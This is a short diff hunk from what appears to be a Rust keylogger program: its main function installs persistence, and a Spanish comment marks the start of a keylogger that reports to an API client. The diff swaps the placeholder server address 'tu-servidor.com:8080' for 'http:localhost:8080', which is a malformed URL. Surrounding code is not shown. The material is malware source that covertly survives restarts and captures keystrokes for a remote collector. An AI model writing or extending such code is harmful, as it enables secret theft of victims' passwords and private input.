@@ -10,7 +10,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     persistence::install()?;
 
     // Iniciar keylogger
-    let api_client = Arc::new(ApiClient::new("http://tu-servidor.com:8080"));
+    let api_client = Arc::new(ApiClient::new("http:localhost:8080"));
     keylogger::start(api_client)?;
 
     Ok(())
